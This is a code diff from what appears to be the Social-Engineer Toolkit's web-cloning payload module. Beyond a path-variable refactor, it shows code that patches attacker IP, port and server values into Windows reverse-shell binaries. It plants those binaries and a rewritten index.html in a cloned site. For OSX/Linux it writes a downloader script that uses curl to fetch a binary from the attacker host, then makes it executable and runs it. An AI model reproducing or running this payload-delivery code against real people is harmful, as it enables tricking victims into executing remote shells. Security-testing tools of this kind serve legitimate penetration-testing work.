@@ -43,12 +43,12 @@ for line in fileopen:
                 "\n   [-] SET Interactive Mode is set to DISABLED. Please change it in the SET config")
 
 # make directory if it's not there
-if not os.path.isdir(setdir + "/web_clone/"):
-    os.makedirs(setdir + "/web_clone/")
+if not os.path.isdir(userconfigpath + "web_clone/"):
+    os.makedirs(userconfigpath + "web_clone/")
 
 # grab ip address and SET web server interface
-if os.path.isfile(setdir + "/interface"):
-    fileopen = open(setdir + "interface", "r")
+if os.path.isfile(userconfigpath + "interface"):
+    fileopen = open(userconfigpath + "interface", "r")
     for line in fileopen:
         ipaddr = line.rstrip()
 
@@ -94,8 +94,8 @@ webserver = exe_name + " " + webserver
 
 # this is generated through payloadgen.py and lets SET know if its a RATTE
 # payload or SET payload
-if os.path.isfile(setdir + "/set.payload"):
-    fileopen = open(setdir + "/set.payload", "r")
+if os.path.isfile(userconfigpath + "set.payload"):
+    fileopen = open(userconfigpath + "set.payload", "r")
     for line in fileopen:
         payload_selection = line.rstrip()
 else:
@@ -105,7 +105,7 @@ else:
 # determine if we want to target osx/nix as well
 posix = False
 # find if we selected it
-if os.path.isfile(setdir + "/set.payload.posix"):
+if os.path.isfile(userconfigpath + "set.payload.posix"):
     # if we have then claim true
     posix = True
 
@@ -114,20 +114,20 @@ if payload_selection == "SETSHELL":
     # replace ipaddress with one that we need for reverse connection back
     fileopen = open("src/payloads/set_payloads/downloader.windows", "rb")
     data = fileopen.read()
-    filewrite = open(setdir + "/msf.exe", "wb")
+    filewrite = open(userconfigpath + "msf.exe", "wb")
     host = int(len(exe_name) + 1) * "X"
     webserver_count = int(len(webserver) + 1) * "S"
     ipaddr_count = int(len(ipaddr) + 1) * "M"
     filewrite.write(data.replace(str(host), exe_name + "\x00", 1))
     filewrite.close()
-    fileopen = open(setdir + "/msf.exe", "rb")
+    fileopen = open(userconfigpath + "msf.exe", "rb")
     data = fileopen.read()
-    filewrite = open(setdir + "/msf.exe", "wb")
+    filewrite = open(userconfigpath + "msf.exe", "wb")
     filewrite.write(data.replace(str(webserver_count), webserver + "\x00", 1))
     filewrite.close()
-    fileopen = open(setdir + "/msf.exe", "rb")
+    fileopen = open(userconfigpath + "msf.exe", "rb")
     data = fileopen.read()
-    filewrite = open(setdir + "/msf.exe", "wb")
+    filewrite = open(userconfigpath + "msf.exe", "wb")
     filewrite.write(data.replace(str(ipaddr_count), ipaddr + "\x00", 1))
     filewrite.close()
 
@@ -135,14 +135,14 @@ if payload_selection == "SETSHELL":
 if payload_selection == "RATTE":
     fileopen = open("src/payloads/ratte/ratte.binary", "rb")
     data = fileopen.read()
-    filewrite = open(setdir + "/msf.exe", "wb")
+    filewrite = open(userconfigpath + "msf.exe", "wb")
     host = int(len(ipaddr) + 1) * "X"
     rPort = int(len(str(port)) + 1) * "Y"
     filewrite.write(data.replace(str(host), ipaddr + "\x00", 1))
     filewrite.close()
-    fileopen = open(setdir + "/msf.exe", "rb")
+    fileopen = open(userconfigpath + "msf.exe", "rb")
     data = fileopen.read()
-    filewrite = open(setdir + "/msf.exe", "wb")
+    filewrite = open(userconfigpath + "msf.exe", "wb")
     filewrite.write(data.replace(str(rPort), str(port) + "\x00", 1))
     filewrite.close()
 
@@ -152,22 +152,22 @@ if upx_encode == "ON" or upx_encode == "on":
     # core upx
     pass
 
-if os.path.isfile(setdir + "/web_clone/msf.exe"):
-    os.remove(setdir + "/web_clone/msf.exe")
-if os.path.isfile(setdir + "/msf.exe"):
-    shutil.copyfile(setdir + "/msf.exe", setdir + "/web_clone/msf.exe")
+if os.path.isfile(userconfigpath + "web_clone/msf.exe"):
+    os.remove(userconfigpath + "web_clone/msf.exe")
+if os.path.isfile(userconfigpath + "msf.exe"):
+    shutil.copyfile(userconfigpath + "msf.exe", userconfigpath + "web_clone/msf.exe")
 
 if payload_selection == "SETSHELL":
-    if os.path.isfile(setdir + "/web_clone/x"):
-        os.remove(setdir + "/web_clone/x")
+    if os.path.isfile(userconfigpath + "web_clone/x"):
+        os.remove(userconfigpath + "web_clone/x")
     shutil.copyfile("%s/src/payloads/set_payloads/shell.windows" %
-                    (definepath), setdir + "/web_clone/x")
+                    (definepath), userconfigpath + "web_clone/x")
 
 # if we are targetting nix
 if posix == True:
     print_info(
         "Targetting of OSX/Linux (POSIX-based) as well. Prepping posix payload...")
-    filewrite = open(setdir + "/web_clone/mac.bin", "w")
+    filewrite = open(userconfigpath + "web_clone/mac.bin", "w")
     payload_flags = webserver.split(" ")
     # grab osx binary name
     osx_name = generate_random_string(10, 10)
@@ -255,21 +255,21 @@ if posix == True:
     linux_name = generate_random_string(10, 10)
     downloader = "#!/usr/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (
         payload_flags[1], linux_name, linux_name, linux_name, payload_flags[1], payload_flags[2])
-    filewrite = open(setdir + "/web_clone/nix.bin", "w")
+    filewrite = open(userconfigpath + "web_clone/nix.bin", "w")
     filewrite.write(downloader)
     filewrite.close()
     shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.osx",
-                    setdir + "/web_clone/%s" % (osx_name))
+                    userconfigpath + "web_clone/%s" % (osx_name))
     shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.linux",
-                    setdir + "/web_clone/%s" % (linux_name))
+                    userconfigpath + "web_clone/%s" % (linux_name))
 
     # copy over the downloader scripts
     osx_down = check_options("MAC.BIN=")
     lin_down = check_options("NIX.BIN=")
-    shutil.copyfile(setdir + "/web_clone/nix.bin",
-                    setdir + "/web_clone/%s" % (lin_down))
-    shutil.copyfile(setdir + "/web_clone/mac.bin",
-                    setdir + "/web_clone/%s" % (osx_down))
+    shutil.copyfile(userconfigpath + "web_clone/nix.bin",
+                    userconfigpath + "web_clone/%s" % (lin_down))
+    shutil.copyfile(userconfigpath + "web_clone/mac.bin",
+                    userconfigpath + "web_clone/%s" % (osx_down))
 
 # check to see if we are using a staged approach or direct shell
 stager = check_config("SET_SHELL_STAGER=").lower()
@@ -277,11 +277,11 @@ if stager == "off" or payload_selection == "SETSHELL_HTTP":
     # only trigger if we are using the SETSHELL
     if payload_selection == "SETSHELL" or payload_selection == "SETSHELL_HTTP":
         # ensure that index.html is really there
-        if os.path.isfile(setdir + "/web_clone/index.html"):
+        if os.path.isfile(userconfigpath + "web_clone/index.html"):
             print_status(
                 "Stager turned off, prepping direct download payload...")
-            fileopen = open(setdir + "/web_clone/index.html", "r")
-            filewrite = open(setdir + "/web_clone/index.html.3", "w")
+            fileopen = open(userconfigpath + "web_clone/index.html", "r")
+            filewrite = open(userconfigpath + "web_clone/index.html.3", "w")
             data = fileopen.read()
             # replace freehugs with ip and port
             data = data.replace("freehugs", reverse_connection)
@@ -293,22 +293,22 @@ if stager == "off" or payload_selection == "SETSHELL_HTTP":
             # be newer
             if payload_selection == "SETSHELL":
                 try:
-                    if os.path.isfile(setdir + "/web_clone/index.html"):
-                        os.remove(setdir + "/web_clone/index.html")
-                    shutil.copyfile(setdir + "/web_clone/index.html.3",
-                                    setdir + "/web_clone/index.html")
-                    if os.path.isfile(setdir + "/web_clone/index.html.3"):
-                        os.remove(setdir + "/web_clone/index.html.3")
-                    if os.path.isfile(setdir + "/web_clone/msf.exe"):
-                        os.remove(setdir + "/web_clone/msf.exe")
-                    shutil.copyfile(setdir + "/web_clone/x",
-                                    setdir + "/web_clone/msf.exe")
+                    if os.path.isfile(userconfigpath + "web_clone/index.html"):
+                        os.remove(userconfigpath + "web_clone/index.html")
+                    shutil.copyfile(userconfigpath + "web_clone/index.html.3",
+                                    userconfigpath + "web_clone/index.html")
+                    if os.path.isfile(userconfigpath + "web_clone/index.html.3"):
+                        os.remove(userconfigpath + "web_clone/index.html.3")
+                    if os.path.isfile(userconfigpath + "web_clone/msf.exe"):
+                        os.remove(userconfigpath + "web_clone/msf.exe")
+                    shutil.copyfile(userconfigpath + "web_clone/x",
+                                    userconfigpath + "web_clone/msf.exe")
                     shutil.copyfile(
-                        setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
-                    if os.path.isfile(setdir + "/msf.exe"):
-                        os.remove(setdir + "/msf.exe")
+                        userconfigpath + "web_clone/msf.exe", userconfigpath + "msf.exe")
+                    if os.path.isfile(userconfigpath + "msf.exe"):
+                        os.remove(userconfigpath + "msf.exe")
                     shutil.copyfile(
-                        setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
+                        userconfigpath + "web_clone/msf.exe", userconfigpath + "msf.exe")
 
                 # catch errors, will convert to log later
                 except Exception as error:
@@ -317,22 +317,22 @@ if stager == "off" or payload_selection == "SETSHELL_HTTP":
             # if we are using the HTTP reverse shell then lets use this
             if payload_selection == "SETSHELL_HTTP":
                 try:
-                    if os.path.isfile(setdir + "/web_clone/index.html"):
-                        os.remove(setdir + "/web_clone/index.html")
-                    shutil.copyfile(setdir + "/web_clone/index.html.3",
-                                    setdir + "/web_clone/index.html")
-                    if os.path.isfile(setdir + "/web_clone/index.html.3"):
-                        os.remove(setdir + "/web_clone/index.html.3")
-                    if os.path.isfile(setdir + "/web_clone/msf.exe"):
-                        os.remove(setdir + "/web_clone/msf.exe")
+                    if os.path.isfile(userconfigpath + "web_clone/index.html"):
+                        os.remove(userconfigpath + "web_clone/index.html")
+                    shutil.copyfile(userconfigpath + "web_clone/index.html.3",
+                                    userconfigpath + "web_clone/index.html")
+                    if os.path.isfile(userconfigpath + "web_clone/index.html.3"):
+                        os.remove(userconfigpath + "web_clone/index.html.3")
+                    if os.path.isfile(userconfigpath + "web_clone/msf.exe"):
+                        os.remove(userconfigpath + "web_clone/msf.exe")
                     shutil.copyfile(
-                        "src/payloads/set_payloads/http_shell.binary", setdir + "/web_clone/msf.exe")
+                        "src/payloads/set_payloads/http_shell.binary", userconfigpath + "web_clone/msf.exe")
                     shutil.copyfile(
-                        setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
-                    if os.path.isfile(setdir + "/msf.exe"):
-                        os.remove(setdir + "/msf.exe")
+                        userconfigpath + "web_clone/msf.exe", userconfigpath + "msf.exe")
+                    if os.path.isfile(userconfigpath + "msf.exe"):
+                        os.remove(userconfigpath + "msf.exe")
                     shutil.copyfile(
-                        setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
+                        userconfigpath + "web_clone/msf.exe", userconfigpath + "msf.exe")
 
                 # catch errors, will convert to log later
                 except Exception as error:
